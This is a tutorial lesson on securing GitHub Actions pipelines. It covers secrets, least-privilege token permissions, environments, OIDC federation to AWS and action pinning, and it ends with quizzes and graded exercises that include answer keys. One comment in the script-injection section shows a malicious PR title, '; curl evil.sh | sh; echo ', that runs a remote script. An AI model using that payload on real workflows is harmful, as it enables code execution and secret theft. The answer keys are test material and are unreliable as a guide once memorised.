---
id: cicd-secrets
title: Secrets, permissions & OIDC
summary: Repository, environment and organization secrets, configuration variables, masking, why pull requests from forks get no secrets, least-privilege GITHUB_TOKEN permissions, environments with required reviewers, OIDC federation to AWS instead of long-lived keys, and pinning actions for supply-chain safety.
minutes: 35
---
> [!project] Taskboard, step 4: credentials without keys
> Taskboard's pipeline will push images and deploy to AWS. This step locks down the token's permissions and connects to AWS through OIDC, so there are no long-lived keys to leak.

## Secrets and variables

Store credentials in **Settings → Secrets and variables → Actions**, never in the repository:

```yaml
steps:
  - run: ./publish.sh
    env:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
      REGISTRY_URL: ${{ vars.REGISTRY_URL }}
```

| Kind | For | Visible in logs? |
|---|---|---|
| `secrets.X` | passwords, tokens, keys | **masked**: printed as `***` |
| `vars.X` | non-sensitive configuration (URLs, region names, feature flags) | yes |

Secrets can be defined per **repository**, per **environment** (only jobs targeting that environment can read them) and per **organization** (shared across selected repositories).

> [!warn] Masking isn't a security boundary
> GitHub masks the exact secret string in logs, but a transformed value (base64-encoded, reversed, split across lines) won't be masked. Anyone who can change a workflow that receives a secret can exfiltrate it. Protect which branches can run workflows that use production secrets.

Rules of thumb:

- Pass secrets to steps through `env:`, not interpolated directly into `run:` scripts. `${{ }}` is expanded **before** the shell runs, which is also how **script injection** happens.
- Never `echo` a secret, and never write it to an artifact or a cache.
- If a secret leaks, **rotate it**. Deleting the log isn't enough.

## Script injection

Untrusted input (a PR title, a branch name, an issue body) interpolated into a script becomes code:

```yaml
# DANGEROUS: a PR titled  "; curl evil.sh | sh; echo "  runs that command
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE: the shell sees a variable, not code
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

## Pull requests from forks

For `pull_request` events from **forks**, workflows get **no secrets** and a **read-only** `GITHUB_TOKEN`. Otherwise anyone could open a PR that prints your secrets.

`pull_request_target` runs in the context of the **base** repository *with* secrets. That's safe only if you never check out and run the PR's code in it. Combining `pull_request_target` with checking out the PR head is a well-known way to get secrets stolen.

## GITHUB_TOKEN permissions

Every run gets an automatic, short-lived `GITHUB_TOKEN` scoped to the repository. Give it the **least** permissions needed:

```yaml
permissions:
  contents: read            # workflow-wide default

jobs:
  release:
    permissions:
      contents: write       # create releases and tags
      packages: write       # push to ghcr.io
    runs-on: ubuntu-latest
    steps: ...
```

Once you set `permissions:`, everything not listed is `none`. Common scopes: `contents`, `packages`, `pull-requests`, `issues`, `id-token` (OIDC), `checks`, `deployments`, `security-events`. Also set the organization default to read-only.

## Environments

An **environment** (Settings → Environments) represents a deployment target, like `staging` or `production`, with protection rules:

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://shop.example.com
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}   # an environment secret
```

- **Required reviewers**: the job pauses until an approver clicks Approve. That's continuous delivery's manual gate.
- **Wait timer**: a delay before the job starts.
- **Deployment branches**: only `main` (or tags `v*`) may deploy to production.
- **Environment secrets** are only available to jobs that reference that environment and pass its rules.

## OIDC: no long-lived cloud keys

The old way to deploy to AWS was storing `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` as secrets. Those keys never expire, and if they leak, they work from anywhere.

With **OpenID Connect (OIDC)**, GitHub issues a short-lived, signed identity token for each job. AWS trusts GitHub's identity provider and exchanges the token for temporary credentials of an IAM role, but only if the token's claims (repository, branch, environment) match the role's trust policy:

```yaml
permissions:
  id-token: write          # allow requesting the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: eu-west-1
      - run: aws s3 sync ./site s3://my-site-bucket --delete
```

On the AWS side, the role's trust policy restricts **who** can assume it:

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/shop:environment:production"
    }
  }
}
```

The same pattern works for Google Cloud (Workload Identity Federation), Azure (federated credentials) and HashiCorp Vault.

## Supply-chain safety for actions

`uses: some-org/some-action@v2` runs someone else's code with access to your token and secrets. A tag like `v2` can be **moved** to point at different code, so a compromised action can steal secrets from thousands of repositories at once (this has happened).

- **Pin third-party actions to a full commit SHA**: `uses: some-org/some-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v2.1.0`. Dependabot can keep pinned SHAs updated.
- Prefer actions from GitHub (`actions/*`) and verified creators.
- Restrict allowed actions in organization settings.
- Keep `permissions` minimal so a compromised step can do less.

## Worked example: an inventory of Taskboard's secrets

List every credential the pipeline touches and decide where it should come from:

| Credential | Needed by | Source |
|---|---|---|
| push to `ghcr.io` | image job | built-in `GITHUB_TOKEN` with `packages: write` |
| AWS access for deploys | deploy jobs | **OIDC** role, no stored keys |
| Codecov upload token | test job | repository secret |
| production `SECRET_KEY`, DB password | the running app | AWS Secrets Manager, read by the app at runtime, never in CI |
| Slack webhook | notify job | repository secret |

Notice the last-but-one row: the app's runtime secrets **never pass through CI at all**. CI deploys an image and a task definition that *references* a secret; the platform injects the value at runtime. The fewer places a secret travels, the fewer places it can leak.

## Worked example: the trust relationship

For OIDC, AWS needs to know *which* workflows may assume the deploy role. Taskboard's trust policy allows exactly:

- repository `acme/taskboard`,
- running in the GitHub **environment** `production` (or `staging` for the staging role).

A job that targets `production` gets an environment-based subject, even if it originates on a feature branch. Restrict deployment branches and require reviewers in the GitHub environment as well as checking the subject in AWS; otherwise an untrusted branch could target that environment.

> [!plain] In plain English
> Instead of giving GitHub a permanent AWS password, AWS agrees to trust short-lived ID cards that GitHub issues to specific workflows, and only hands out temporary credentials to the ones it recognizes.

:::quiz
q: A pull request comes from a fork. Which secrets can its `pull_request` workflow read?
+ none; and its GITHUB_TOKEN is read-only
- all repository secrets
- only organization secrets
- environment secrets only
why: Otherwise anyone could open a PR that dumps your secrets.
:::

:::quiz
q: What does OIDC federation replace?
- the GITHUB_TOKEN
+ long-lived cloud access keys stored as secrets
- environments
- runners
why: Each job exchanges a short-lived OIDC token for temporary cloud credentials.
:::

:::quiz
q: Which permission must a job have to request an OIDC token?
- contents: write
+ id-token: write
- packages: write
- actions: write
why: id-token: write allows the job to fetch the OIDC JWT.
:::

:::quiz
q: Why pin third-party actions to a commit SHA instead of `@v2`?
+ tags can be moved to malicious code; a SHA is immutable
- SHAs run faster
- tags aren't supported for third-party actions
- GitHub requires it
why: A full commit SHA always refers to the exact code you reviewed.
:::

:::quiz
q: Which line is vulnerable to script injection?
+ `run: echo "${{ github.event.issue.title }}"`
- `run: echo "$TITLE"` with `env: TITLE: ${{ github.event.issue.title }}`
- `run: echo "${{ github.sha }}"`
- `run: echo "$GITHUB_REF_NAME"`
why: Attacker-controlled text is expanded into the script before the shell parses it.
:::

:::exercise
id: gs-env-secret
level: 1
title: Use a secret safely
mode: code
lang: yaml
file: .github/workflows/publish.yml
---
Pass the repository secret `PYPI_TOKEN` to the publish step as the environment variable `TWINE_PASSWORD`, and set `TWINE_USERNAME` to `__token__`.
---starter
name: Publish
on:
  push:
    tags: ["v*"]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install build twine && python -m build
      - run: twine upload dist/*
---rule
run:\s*twine upload dist/\*\s*\n\s+env:
An `env:` block on the upload step
---rule
TWINE_PASSWORD:\s*\$\{\{\s*secrets\.PYPI_TOKEN\s*\}\}
`TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}`
---rule
TWINE_USERNAME:\s*["']?__token__["']?
`TWINE_USERNAME: __token__`
---solution
name: Publish
on:
  push:
    tags: ["v*"]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install build twine && python -m build
      - run: twine upload dist/*
        env:
          TWINE_USERNAME: __token__
          TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}
:::

:::exercise
id: gs-injection
level: 3
title: Fix the injection
mode: code
lang: yaml
file: .github/workflows/greet.yml
---
This workflow interpolates the PR title straight into a shell script. Make it safe: pass the title through an environment variable `TITLE` and reference `$TITLE` in the script.
---starter
name: Greet
on: pull_request

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
---rule
!run:[^\n]*\$\{\{\s*github\.event\.pull_request\.title
No `${{ ... }}` of the title inside `run:`
---rule
TITLE:\s*\$\{\{\s*github\.event\.pull_request\.title\s*\}\}
`env: TITLE: ${{ github.event.pull_request.title }}`
---rule
run:\s*echo\s+"Thanks for the PR: \$TITLE"
Use `$TITLE` in the script
---solution
name: Greet
on: pull_request

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Thanks for the PR: $TITLE"
        env:
          TITLE: ${{ github.event.pull_request.title }}
:::

:::exercise
id: gs-permissions
level: 2
title: Least-privilege token
mode: code
lang: yaml
file: .github/workflows/ci.yml
---
Set the workflow-wide `GITHUB_TOKEN` permissions to read-only contents, and give only the `release` job `contents: write`.
---starter
name: CI
on:
  push:
    tags: ["v*"]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
  release:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: gh release create "$GITHUB_REF_NAME" --generate-notes
        env:
          GH_TOKEN: ${{ github.token }}
---rule
^permissions:\s*\n\s+contents:\s*read
Top-level `permissions: contents: read`
---rule
release:\s*\n(\s{4}.*\n)*?\s{4}permissions:\s*\n\s{6}contents:\s*write
`release` job has `contents: write`
---solution
name: CI
on:
  push:
    tags: ["v*"]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - run: gh release create "$GITHUB_REF_NAME" --generate-notes
        env:
          GH_TOKEN: ${{ github.token }}
:::

:::exercise
id: gs-environment
level: 2
title: Gate production
mode: code
lang: yaml
file: .github/workflows/deploy.yml
---
Make the `deploy` job target the environment named `production` with URL `https://shop.example.com`, so its protection rules (reviewers) and secrets apply.
---starter
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
---rule
environment:\s*\n\s+name:\s*production\s*\n\s+url:\s*https://shop\.example\.com|environment:\s*\n\s+url:\s*https://shop\.example\.com\s*\n\s+name:\s*production
`environment: { name: production, url: https://shop.example.com }`
---solution
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://shop.example.com
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
:::

:::exercise
id: gs-oidc
level: 3
title: Deploy to AWS with OIDC
mode: code
lang: yaml
file: .github/workflows/deploy.yml
---
Replace the stored access keys with OIDC: grant `id-token: write` and `contents: read` at the workflow level, and configure credentials with `aws-actions/configure-aws-credentials@v4` using `role-to-assume: arn:aws:iam::123456789012:role/github-deploy` and `aws-region: us-east-1`. Remove the key secrets.
---starter
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
      - run: aws s3 sync ./site s3://shop-site --delete
---rule
^permissions:\s*\n(\s+.*\n)*?\s+id-token:\s*write
`id-token: write`
---rule
^permissions:\s*\n(\s+.*\n)*?\s+contents:\s*read
`contents: read`
---rule
role-to-assume:\s*arn:aws:iam::123456789012:role/github-deploy
`role-to-assume`
---rule
aws-region:\s*us-east-1
`aws-region: us-east-1`
---rule
!secrets\.AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY)
No stored keys
---solution
name: Deploy
on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: us-east-1
      - run: aws s3 sync ./site s3://shop-site --delete
:::

:::exercise
id: gs-trust-sub
level: 3
title: Scope the trust policy
mode: answer
---
Write the OIDC `sub` claim value that allows only jobs of the repository `acme/shop` running in the GitHub **environment** `production` to assume the role.
---answer
repo:acme/shop:environment:production
---solution
repo:acme/shop:environment:production
---explain
Other forms: `repo:acme/shop:ref:refs/heads/main` (a branch) or `repo:acme/shop:pull_request`. Never use a wildcard like `repo:acme/*`.
:::

:::exercise
id: gs-fork-secret
level: 2
title: Predict: fork PR
mode: answer
---
A workflow triggered by `pull_request` runs `echo "${#NPM_TOKEN}"` with `env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` (it prints the token's length). The PR comes from a **fork**. What does it print?
---answer
0
---solution
0
---explain
Secrets aren't passed to `pull_request` workflows from forks, so the variable is empty.
:::

:::exercise
id: proj-cd-04-perms
level: 2
title: "Project 4: least-privilege token"
mode: code
lang: yaml
file: .github/workflows/ci.yml
path: .github/workflows/ci.yml
---
Taskboard's CI only reads code. Set the workflow-wide permissions to `contents: read`, and give **only** the `image` job `packages: write` (plus `contents: read`).
---starter
name: CI
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pytest -q
  image:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t taskboard .
---rule
^permissions:\s*\n\s+contents:\s*read
Workflow default `contents: read`
---rule
image:\s*\n(\s{4}.*\n)*?\s{4}permissions:\s*\n(\s{6}.*\n)*?\s{6}packages:\s*write
`image` gets `packages: write`
---rule
image:\s*\n(\s{4}.*\n)*?\s{4}permissions:\s*\n(\s{6}.*\n)*?\s{6}contents:\s*read
`image` keeps `contents: read`
---solution
name: CI
on: [push, pull_request]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pytest -q
  image:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t taskboard .
:::

:::exercise
id: proj-cd-04-oidc
level: 3
title: "Project 4b: Taskboard's AWS login"
mode: code
lang: yaml
file: .github/workflows/deploy.yml
path: .github/workflows/deploy.yml
---
Write the `deploy` job: environment `staging`, permissions `id-token: write` and `contents: read`, then `aws-actions/configure-aws-credentials@v4` with `role-to-assume: arn:aws:iam::123456789012:role/taskboard-deploy-staging` and `aws-region: eu-west-1`, then run `aws sts get-caller-identity`.
---starter
name: Deploy
on:
  push:
    branches: [main]

jobs:
---rule
deploy:\s*\n(\s{4}.*\n)*?\s{4}environment:\s*staging
Environment `staging`
---rule
permissions:\s*\n(\s+.*\n)*?\s+id-token:\s*write
`id-token: write`
---rule
permissions:\s*\n(\s+.*\n)*?\s+contents:\s*read
`contents: read`
---rule
uses:\s*aws-actions/configure-aws-credentials@v4
The AWS credentials action
---rule
role-to-assume:\s*arn:aws:iam::123456789012:role/taskboard-deploy-staging
The staging role
---rule
aws-region:\s*eu-west-1
Region
---rule
run:\s*aws sts get-caller-identity
Check who we are
---rule
!aws-access-key-id
No stored keys
---solution
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: staging
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/taskboard-deploy-staging
          aws-region: eu-west-1
      - run: aws sts get-caller-identity
:::
